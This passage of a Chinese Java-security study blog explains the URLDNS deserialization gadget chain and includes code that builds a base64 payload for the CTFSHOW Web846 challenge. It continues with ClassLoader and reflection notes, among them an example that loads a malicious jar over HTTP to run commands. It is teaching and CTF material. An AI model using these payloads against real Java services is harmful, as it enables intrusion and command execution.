alt="image-20230318183016507"></p><p>是URLStreamHandler类（也是我们传入的handler），也就是说这里调用的是URLStreamHandler.hashCode</p><p>跟进去之后有个getHostAddress方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318181320932.png" alt="image-20230318181320932"></p><p>再往里跟会发现u是通过InetAddress.getByName获取到的ip地址</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318181948359.png" alt="image-20230318181948359"></p><p>然后再通过getHost发送一个DNS请求</p><p>至此执行类的分析完成</p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>最后一部分是调用链，其实从入口类和执行类的分析就可以大概的看出调用链</p><ol><li>HashMap -&gt; readObject()</li><li>HashMap -&gt; hash()</li><li>URL -&gt; hashCode()</li><li>URLStreamHandler -&gt; hashCode()</li><li>URLStreamHandler -&gt; getHostAddress()</li><li>InetAddress-&gt; getByName()</li></ol><h2 id="初次利用"><a href="#初次利用" class="headerlink" title="初次利用"></a>初次利用</h2><p>先在bp上生成一个url接收DNS请求，dnslog也行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318184455889.png" alt="image-20230318184455889"></p><p>根据前边说的，利用就是创建个HashMap然后把key的位置传入URL类</p><pre class="language-none"><code class="language-none">HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;();h.put(new URL(&quot;http:&#x2F;&#x2F;xxxx&quot;),1);</code></pre><p>然后我们对其进行序列化，然后再进行反序列化，在反序列化时我们就可以收到一个DNS请求</p><p>但是在实验过程中，我们会发现，就算没有进行反序列化，在bp上也同样能检测到有一个发送过来的请求</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318184207283.png" alt="image-20230318184207283"></p><p>为什么会这样呢？</p><p>其实原因在put方法里</p><p>跟进去看一下可以看见</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318195923449.png" alt="image-20230318195923449"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318195933134.png" alt="image-20230318195933134"></p><p>在我们put的时候，就已经触发了hashCode函数，相当于走完了我们的利用链，然后向目标地址发送了dns请求。</p><p>但是这并不是我们想要的</p><p>因为URL里的hashCode中的这个判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318180244597.png" alt="image-20230318180244597"></p><p>hashCode的初始值是-1，但是经过put走完我们的链子后，hashCode的值就会被改变，这时如果我们再执行反序列化，由于hashCode的值不再是-1，就不能再调用handler.hashCode的值从而实现向目标url发送dns请求的目的了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318201605984.png" alt="image-20230318201605984"></p><p>因此，这里在put后，还需要使用反射让hashCode的值重新为-1</p><h2 id="再次利用"><a href="#再次利用" class="headerlink" title="再次利用"></a>再次利用</h2><pre class="language-java" data-language="java"><code class="language-java">public class serializTest &#123;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;1.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;    public static Object unserialize() throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(&quot;1.bin&quot;));        Object o &#x3D; ois.readObject();        return o;    &#125;&#125;</code></pre><pre class="language-JAVA" data-language="JAVA"><code class="language-JAVA">package URLDNS;import serializTest.serializTest;import java.io.IOException;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Test &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException &#123;        HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;();        &#x2F;&#x2F; 反射获取hashCode的值        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;java.net.URL&quot;);        Field hashCode &#x3D; aClass.getDeclaredField(&quot;hashCode&quot;);        hashCode.setAccessible(true);        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;cp9s9x.dnslog.cn&quot;);        &#x2F;&#x2F; 防止在put时就发送请求，干扰判断        hashCode.set(url,1);        System.out.println(hashCode.get(url));        &#x2F;&#x2F; 装入HashMap        h.put(url,1);        &#x2F;&#x2F; 改回-1使反序列化时进行dns请求        hashCode.set(url,-1);        serializTest.serialize(h);        System.out.println(hashCode.get(url));        Object unserialize &#x3D; serializTest.unserialize();        System.out.println(unserialize);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318204055248.png" alt="image-20230318204055248"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318204014975.png" alt="image-20230318204014975"></p><h2 id="CTFSHOW-Web846"><a href="#CTFSHOW-Web846" class="headerlink" title="CTFSHOW Web846"></a>CTFSHOW Web846</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319153251549.png" alt="image-20230319153251549"></p><p>为了实现这个目的，我们可以把序列化的内容写到一个输出流里，然后用toByteArray将字节流转换为字节数组，再用base64编码输出</p><p>修改后的代码为</p><pre class="language-java" data-language="java"><code class="language-java">        HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;();        &#x2F;&#x2F; 反射获取hashCode的值        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;java.net.URL&quot;);        Field hashCode &#x3D; aClass.getDeclaredField(&quot;hashCode&quot;);        hashCode.setAccessible(true);        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;c83f8a14-f34c-4106-ae2b-0f835c562ad4.challenge.ctf.show&quot;);&#x2F;&#x2F;网址最后的斜杠要删掉        &#x2F;&#x2F; 防止在put时就发送请求，干扰判断        hashCode.set(url,1);&#x2F;&#x2F;&#x2F;&#x2F;        System.out.println(hashCode.get(url));        &#x2F;&#x2F; 装入HashMap        h.put(url,1);        &#x2F;&#x2F; 改回-1使反序列化时进行dns请求        hashCode.set(url,-1);&#x2F;&#x2F;        serializTest.serialize(h);        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(h);&#x2F;&#x2F;        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));        byte[] buf &#x3D; byteArrayOutputStream.toByteArray();        &#x2F;&#x2F; base64编码        Base64.Encoder encoder &#x3D; Base64.getEncoder();        String base64 &#x3D; encoder.encodeToString(buf);        System.out.println(base64);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319155736513.png" alt="image-20230319155736513"></p><p>然后以post方式提交就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319155752794.png" alt="image-20230319155752794"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java</title>
      <link href="/2023/03/16/Java/"/>
      <url>/2023/03/16/Java/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.javasec.org/">https://www.javasec.org</a></p><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/02.Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6.html#%E4%BD%95%E4%B8%BA%E5%8F%8D%E5%B0%84">02.Java反射机制 · d4m1ts 知识库 (gm7.org)</a></p><h1 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a>ClassLoader（类加载机制）</h1><p>Java能成为跨平台开发语言的原因就是JVM（Java虚拟机）的存在，Java程序在允许前要先编译为class文件，然后在Java类初始化（这是类加载的最后阶段，所有的静态变量都将被赋予原始值，并且静态区块将被执行。）时会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p><h2 id="Jvm架构图"><a href="#Jvm架构图" class="headerlink" title="Jvm架构图"></a>Jvm架构图</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316151025559.png" alt="image-20230316151025559"></p><p>具体介绍看这个<a href="https://cloud.tencent.com/developer/article/1042507">https://cloud.tencent.com/developer/article/1042507</a></p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p><strong>但是虽然默认使用的App ClassLoader加载类，但是加载顺序却是不同的</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316155755283.png" alt="image-20230316155755283"></p><p>但是我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code>。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316160205108.png" alt="image-20230316160205108"></p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><p><code>loadClass</code>（加载指定的Java类）</p></li><li><p><code>findClass</code>（查找指定的Java类）</p></li><li><p><code>findLoadedClass</code>（查找JVM已经加载过的类）</p></li><li><p><code>defineClass</code>（定义一个Java类）</p></li><li><p><code>resolveClass</code>（链接指定的Java类）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316153913076.png" alt="image-20230316153913076"></p></li></ol><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316153905380.png" alt="image-20230316153905380"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316154411264.png" alt="image-20230316154411264"></p><p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code>，而<code>ClassLoader.loadClass</code>默认不会初始化类方法。</p><h2 id="类加载流程"><a href="#类加载流程" class="headerlink" title="类加载流程"></a>类加载流程</h2><p>首先是class文件加载到jvm内存的过程</p><p>就以上图使用反射加载test为例</p><ol><li><p>ClassLoader会调用public Class&lt;?&gt; loadClass(String name)去加载test类</p></li><li><p>调用<strong>findLoadedClass</strong>方法检查test类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</p></li><li><p>如果创建当前ClassLoader时传入了父类加载器（new ClassLoader(父类加载器)）就使用父类加载器加载test类，否则使用JVM的Bootstrap ClassLoader加载。</p><p>但是这里它并不是自己进行查找，而是先委托给父加载器，然后递归委托，直到Bootstrap ClassLoader加载器；如果Bootstrap classloader找到了，直接加载并且返回class和resource；如果没有找到，则一级一级返回，最后才是自己（这里的自己正常的肯定就是App ClassLoader，要不然就是你的自定义的类加载器）去查找加载。这个机制被称为<strong>双亲委派</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316162218853.png" alt="image-20230316162218853"></p></li><li><p>如果当前的ClassLoader没有重写了<strong>findClass</strong>方法，那么直接返回类加载失败异常。如果当前类重写了<strong>findClass</strong>方法并通过传入的test类名找到了对应的类字节码，那么应该调用<strong>defineClass</strong>方法去JVM中注册该类。（注意这个defineClass方法，后面我们会讲到利用defineClass来加载任意类执行恶意代码的操作）</p></li><li><p>如果调用loadClass的时候传入的resolve参数为true，那么还需要调用<strong>resolveClass</strong>方法链接类，默认为false。</p></li><li><p>返回一个被JVM加载后的java.lang.Class类对象。</p></li></ol><p>到这里，.class文件就已经被加载到jvm内存里面了，装载完成以后会得到一个Class对象，然后我们就可以使用new关键字，来实例化这个对象。</p><p>一个类从被加载到虚拟机内存中开始，到卸载出内存的每个阶段，构成了它的生命周期</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319142004720.png" alt="image-20230319142004720"></p><p><strong>1、加载</strong></p><ul><li>通过类的全名限定获取定义此类的二进制字节流。</li><li>将字节流代表的静态存储结构转化为方法区的运行时数据结构。</li><li>在内存（方法区）生成一个代表这个类的class对象，作为方法区这个类的各种数据访问入口。</li></ul><p>加载和连接是交叉进行的，加载未完成可能连接已经开始了。</p><p><strong>2、验证</strong></p><p> 检查class是否符合要求，非必须阶段，对程序的运行期没有影响，-Xverif:none 关闭（可以提高启动速度）</p><ul><li><p>文件格式验证（魔数、常量类型）；</p></li><li><p>元数据验证（语义分析）；</p></li><li><p>字节码验证（语义合法）；</p></li><li><p>符号引用验证（能否被访问）;</p></li></ul><p><strong>3、准备</strong></p><p> 正式为类变量（static成员变量）分配内存并设置类变量初始值（零值）的阶段，这个变量所使用的内存都将在方法区进行分配，这时候的内存分配仅包括类变量，而不包括实例变量，实例变量将会在对象实例化时随着对象一起在堆中进行分配。</p><p><strong>4、解析</strong></p><p> 虚拟机将常量池内的符号引用替换为直接引用的过程。</p><p><strong>5、初始化</strong></p><p> 初始化阶段是执行类构造器&lt;clinit&gt;()方法的过程，虚拟机会保证一个类的类构造器&lt;clinit&gt;()在多线程环境中被正确的加锁，同步；如果多个线程同时初始化一个类，那么只会有一个线程区执行这个类的类构造器，其他线程阻塞等待，直到&lt;clinit&gt;()方法完毕，同一个类加载器，一个类只会被初始化一次。</p><p><strong>类加载是会执行代码</strong></p><p>初始化：静态代码块</p><p>实例化：构造代码块、无参构造函数</p><p>Class.forname 可选是否初始化</p><p>ClassLoader.loadClass 不进行初始化</p><h2 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h2><p>之前我们简单提到了双亲委派的含义</p><p>接下来介绍一下双亲委派的优点</p><p>​    使用双亲委派模型来组织类加载器之间的关系，有一个显而易见的好处就是Java类随着它的类加载器一起具备了一种带有优先级的层次关系。</p><p>​    例如类<code>java.lang.Object</code>，它存放在<code>rt.jar</code>之中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有使用双亲委派模型，由各个类加载器自行去加载的话，如果用户自己编写了一个称为<code>java.lang.Object</code>的类，并放在程序的ClassPath中，那系统中将会出现多个不同的Object类，Java类型体系中最基础的行为也就无法保证，应用程序也将会变得一片混乱。</p><p>所以它的优点</p><ul><li>系统类防止内存中出现多份同样的字节码</li><li>保证Java程序安全稳定运行</li></ul><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><p>既然URLClassLoader可以加载目录class文件或者远程资源文件，那这里我们也可以写一个ClassLoader去加载我们自己写的类</p><p>例子</p><pre class="language-java" data-language="java"><code class="language-java">package com.anbai.sec.classloader;import java.lang.reflect.Method;&#x2F;** * Creator: yz * Date: 2019&#x2F;12&#x2F;17 *&#x2F;public class TestClassLoader extends ClassLoader &#123;    &#x2F;&#x2F; TestHelloWorld类名    private static String testClassName &#x3D; &quot;com.anbai.sec.classloader.TestHelloWorld&quot;;    &#x2F;&#x2F; TestHelloWorld类字节码    private static byte[] testClassBytes &#x3D; new byte[]&#123;            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,            0, 0, 0, 2, 0, 12    &#125;;    @Override    public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;        &#x2F;&#x2F; 只处理TestHelloWorld类        if (name.equals(testClassName)) &#123;            &#x2F;&#x2F; 调用JVM的native方法定义TestHelloWorld类            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);        &#125;        return super.findClass(name);    &#125;    public static void main(String[] args) &#123;        &#x2F;&#x2F; 创建自定义的类加载器        TestClassLoader loader &#x3D; new TestClassLoader();        try &#123;            &#x2F;&#x2F; 使用自定义的类加载器加载TestHelloWorld类            Class testClass &#x3D; loader.loadClass(testClassName);            &#x2F;&#x2F; 反射创建TestHelloWorld类，等价于 TestHelloWorld t &#x3D; new TestHelloWorld();            Object testInstance &#x3D; testClass.newInstance();            &#x2F;&#x2F; 反射获取hello方法            Method method &#x3D; testInstance.getClass().getMethod(&quot;hello&quot;);            &#x2F;&#x2F; 反射调用hello方法,等价于 String str &#x3D; t.hello();            String str &#x3D; (String) method.invoke(testInstance);            System.out.println(str);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>上面我们说URLClassLoader可以加载远程的资源文件，所以我们可以利用这一特性让程序加载远程的恶意jar文件，去执行其中的命令</p><p>这里直接python起一个本地服务器放cmd.jar的恶意jar包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316194721004.png" alt="image-20230316194721004"></p><pre class="language-java" data-language="java"><code class="language-java">public class CMD &#123;    public static Process exec(String[] cmd) throws IOException &#123;        return Runtime.getRuntime().exec(cmd);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316222229237.png" alt="image-20230316222229237"></p><pre class="language-java" data-language="java"><code class="language-java">import java.io.ByteArrayOutputStream;import java.io.InputStream;import java.net.URL;import java.net.URLClassLoader;public class TestURLClassLoader &#123;    public static void main(String[] args) throws Exception &#123;        &#x2F;&#x2F; 从url指定的远程http服务器上加载的jar文件        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1:8001&#x2F;cmd.jar&quot;);        &#x2F;&#x2F; 创建URLClassLoader加载远程jar包        URLClassLoader urlClassLoader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);        &#x2F;&#x2F;rce命令弹出计算器        String[] cmd &#x3D; new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;dir&quot;&#125;;        &#x2F;&#x2F; 通过URLClassLoader加载远程jar包中的CMD类        Class&lt;?&gt; aClass &#x3D; urlClassLoader.loadClass(&quot;CMD&quot;);        Process process &#x3D; (Process) aClass.getMethod(&quot;exec&quot;, String[].class).invoke(null, (Object) cmd);        InputStream inputStream &#x3D; process.getInputStream();        byte[]                b    &#x3D; new byte[1024];        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();        int                   a    &#x3D; -1;        while ((a &#x3D; inputStream.read(b)) !&#x3D; -1) &#123;            baos.write(b, 0, a);        &#125;        System.out.println(baos);    &#125;&#125;</code></pre><p>这里补一点java命令执行的知识，使用<code>Runtime.getRuntime().exec(cmd);</code>执行java命令的时候，如果只传一个参数就只能执行类似calc这样的命令，如果想执行dir之类的命令，需要穿一个字符数组，格式在Windows上为<code>&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;dir&quot;&#125;</code>，在Linux下为</p><p><code>&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;dir&quot;&#125;</code></p><h2 id="ClassLoader-defineClass-字节码加载任意类"><a href="#ClassLoader-defineClass-字节码加载任意类" class="headerlink" title="ClassLoader.defineClass 字节码加载任意类"></a>ClassLoader.defineClass 字节码加载任意类</h2><p>defineClass 是私有的，要通过反射调用</p><p>code是字节码</p><p>因为ClassLoader.loadClass 不进行初始化，所有要通过newInstance实例化后会执行Test里的静态代码块的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319150055849.png" alt="image-20230319150055849"></p><h2 id="Unsafe-defindClass-字节码加载任意类"><a href="#Unsafe-defindClass-字节码加载任意类" class="headerlink" title="Unsafe.defindClass 字节码加载任意类"></a>Unsafe.defindClass 字节码加载任意类</h2><p>虽然是public，但是不能直接生成，也要通过反射</p><p>Spring里可以直接生成</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319150334947.png" alt="image-20230319150334947"></p><h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><p>反射就是Reflection，<strong>Java的反射是指程序在运行期可以拿到一个对象的所有信息</strong>。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p><p><strong><code>class</code>是由JVM在执行过程中动态加载的。JVM在第一次读取到一种<code>class</code>类型时，将其加载进内存。</strong></p><p>每加载一种<code>class</code>，JVM就为其创建一个<code>Class</code>类型的实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>。简单来说，这里的Class是Class类</p><pre class="language-java" data-language="java"><code class="language-java">public final class Class &#123;    private Class() &#123;&#125;&#125;</code></pre><p>这个Class实例是JVM内部创建的，构造方法是private，只有JVM能创建<code>Class</code>实例</p><p><strong>JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</strong></p><p>通过Class实例获取到class信息的方法就被成为反射</p><h2 id="获取class的Class实例方法"><a href="#获取class的Class实例方法" class="headerlink" title="获取class的Class实例方法"></a>获取class的Class实例方法</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316224422778.png" alt="image-20230316224422778"></p><p>补充一下方法一和方法二</p><p><strong>方法一</strong>：</p><p>调用类的class属性类获取该类对应的Class对象，即：类名.class</p><p><strong>方法二</strong>：</p><p>调用某个类的对象的getClass()方法，即：对象.getClass()；</p><h2 id="通过反射获取字段"><a href="#通过反射获取字段" class="headerlink" title="通过反射获取字段"></a>通过反射获取字段</h2><p>newInstance()调用<strong>无参数构造方法</strong></p><pre class="language-java" data-language="java"><code class="language-java">class ReflectTest02&#123;    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException &#123;        &#x2F;&#x2F; 下面这段代码是以反射机制的方式创建对象。    &#x2F;&#x2F; 通过反射机制，获取Class，通过Class来实例化对象    Class c &#x3D; Class.forName(&quot;javase.reflectBean.User&quot;);    &#x2F;&#x2F; newInstance() 这个方法会调用User这个类的无参数构造方法，完成对象的创建。    &#x2F;&#x2F; 重点是：newInstance()调用的是无参构造，必须保证无参构造是存在的！    Object obj &#x3D; c.newInstance();    System.out.println(obj);&#125;&#125;</code></pre><p>获取属性</p><pre class="language-java" data-language="java"><code class="language-java">import java.util.Arrays;public class Java &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, InstantiationException &#123;        Class tc &#x3D; aa.class;        System.out.println(tc.getName());&#x2F;&#x2F;获取类名        System.out.println(Arrays.toString(tc.getDeclaredFields()));&#x2F;&#x2F;获取所有的属性        System.out.println(tc.getField(&quot;a&quot;));&#x2F;&#x2F; 根据字段名获取某个 public 的field（包括父类）        System.out.println(tc.getDeclaredField(&quot;b&quot;));&#x2F;&#x2F; 根据字段名获取某个 public 的field（不包括父类）        System.out.println(tc.getField(&quot;a&quot;).getName()); &#x2F;&#x2F; 字段名称        System.out.println(tc.getField(&quot;a&quot;).getType()); &#x2F;&#x2F; 字段类型，也是一个Class实例        System.out.println(tc.getField(&quot;a&quot;).getModifiers()); &#x2F;&#x2F; 修饰符        tc.getDeclaredField(&quot;a&quot;).setAccessible(true);        Object o &#x3D; tc.newInstance();        System.out.println(tc.getDeclaredField(&quot;a&quot;).get(o));&#x2F;&#x2F; 获取值        tc.getDeclaredField(&quot;a&quot;).set(o,&quot;111&quot;);        System.out.println(tc.getDeclaredField(&quot;a&quot;).get(o));&#x2F;&#x2F; 获取值    &#125;&#125;class aa&#123;    public  String a &#x3D; &quot;xxx&quot;;    private  int b;    public void a()&#123;        System.out.println(1);    &#125;    public void b(String a)&#123;        System.out.println(a);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230316232232508.png" alt="image-20230316232232508"></p><p>小结：</p><blockquote><ol><li>通过<code>Class</code>实例的方法可以获取<code>Field</code>实例：<code>getField()</code>，<code>getFields()</code>，<code>getDeclaredField()</code>，<code>getDeclaredFields()</code>；</li><li>通过Field实例可以获取字段信息：<code>getName()</code>，<code>getType()</code>，<code>getModifiers()</code>；</li><li>通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用<code>setAccessible(true)</code>来访问非<code>public</code>字段。</li><li>通过反射读写字段是一种非常规方法，它会破坏对象的封装。</li></ol></blockquote><h2 id="通过反射获取方法"><a href="#通过反射获取方法" class="headerlink" title="通过反射获取方法"></a>通过反射获取方法</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230317124813556.png" alt="image-20230317124813556"></p><p>使用invoke进行调用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230317125053005.png" alt="image-20230317125053005"></p><p>小结：</p><blockquote><p>Java的反射API提供的Method对象封装了方法的所有信息：</p><ol><li>通过<code>Class</code>实例的方法可以获取<code>Method</code>实例：<code>getMethod()</code>，<code>getMethods()</code>，<code>getDeclaredMethod()</code>，<code>getDeclaredMethods()</code>；</li><li>通过<code>Method</code>实例可以获取方法信息：<code>getName()</code>，<code>getReturnType()</code>，<code>getParameterTypes()</code>，<code>getModifiers()</code>；</li><li>通过<code>Method</code>实例可以调用某个对象的方法：<code>Object invoke(Object instance, Object... parameters)</code>；</li><li>通过设置<code>setAccessible(true)</code>来访问非<code>public</code>方法；</li><li>通过反射调用方法时，仍然遵循多态原则。</li></ol></blockquote><h2 id="调用构造方法"><a href="#调用构造方法" class="headerlink" title="调用构造方法"></a>调用构造方法</h2><p>newInstance()只能调用无参的且为public类型的构造方法来进行实例化对象，但是如果构造方法有参数时或者不是public类型时，需要用getConstructor来配合newInstance()使用</p><p>我们把aa类里的构造方法写为</p><pre class="language-java" data-language="java"><code class="language-java">public aa(String a) &#123;    System.out.println(a);&#125;</code></pre><p>此时需要创建实例化对象的步骤就应该变为</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230317125725886.png" alt="image-20230317125725886"></p><p>小结：</p><blockquote><p><code>Constructor</code>对象封装了构造方法的所有信息；</p><ol><li>通过<code>Class</code>实例的方法可以获取<code>Constructor</code>实例：<code>getConstructor()</code>，<code>getConstructors()</code>，<code>getDeclaredConstructor()</code>，<code>getDeclaredConstructors()</code>；</li><li>通过<code>Constructor</code>实例可以创建一个实例对象：<code>newInstance(Object... parameters)</code>； 